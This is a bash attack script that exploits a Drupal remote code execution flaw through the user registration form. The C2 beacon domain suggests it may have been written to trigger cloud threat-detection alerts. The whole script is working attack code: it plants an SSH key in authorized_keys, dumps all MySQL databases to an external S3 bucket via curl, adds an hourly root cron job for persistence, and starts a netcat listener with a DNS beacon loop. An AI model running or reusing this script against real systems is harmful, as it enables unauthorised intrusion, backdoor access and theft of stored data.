#!/usr/bin/env bash

set -euo pipefail

readonly IP=$1
readonly BUCKET=$2
readonly SSH="ssh -oStrictHostKeyChecking=no -i /tmp/exploit_key ubuntu@${IP}"

main () {
    test_for_exploit
    add_ssh_keys
    dump_database
    persist
    callback_to_known_c2
}

test_for_exploit () {
    exploit 'echo "Exploit is ready" > hello.txt'
    curl --fail "http://${IP}/hello.txt"
}

add_ssh_keys () {
    if [ ! -f /tmp/exploit_key ]; then
        ssh-keygen -q -N '' -t rsa -b 4096 -f /tmp/exploit_key
    fi

    public_key=$(cat /tmp/exploit_key.pub)

    exploit "echo '${public_key}' >> /home/ubuntu/.ssh/authorized_keys"
}

exploit () {
    curl "http://${IP}/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
        --data 'form_id=user_register_form' \
        --data '_drupal_ajax=1' \
        --data 'timezone[a][#lazy_builder][]=exec' \
        --data-urlencode "timezone[a][#lazy_builder][][]=${1}" \
        --silent \
        --output /dev/null
}

dump_database () {
    readonly DEST="https://${BUCKET}.s3.amazonaws.com/${IP}---\$(date \"+%F-%T\").sql.gz"
    readonly DB_SCRIPT="#!/bin/bash
        sudo mysqldump --all-databases | gzip > /dev/shm/databases.sql.gz
        curl -X PUT -T /dev/shm/databases.sql.gz -L \"${DEST}\"
    "
    $SSH "echo '${DB_SCRIPT}' | sudo tee /etc/naughty.sh; \
         sudo chmod +x /etc/naughty.sh;
         /etc/naughty.sh"
}

persist () {
    $SSH 'echo -e "0 * * * * root /etc/naughty.sh >/dev/null 2>&1\n" | sudo tee -a /etc/crontab'
}

callback_to_known_c2 () {
    readonly C2_SCRIPT="#!/bin/bash
    nc -l -p 8080 &
    while :
    do
        dig guarddutyc2activityb.com any
        sleep 1
    done "
    $SSH "echo '${C2_SCRIPT}' | tee fone-home.sh; \
         chmod +x fone-home.sh;
         echo '/bin/bash ./fone-home.sh' | at now +1 minute"
}

main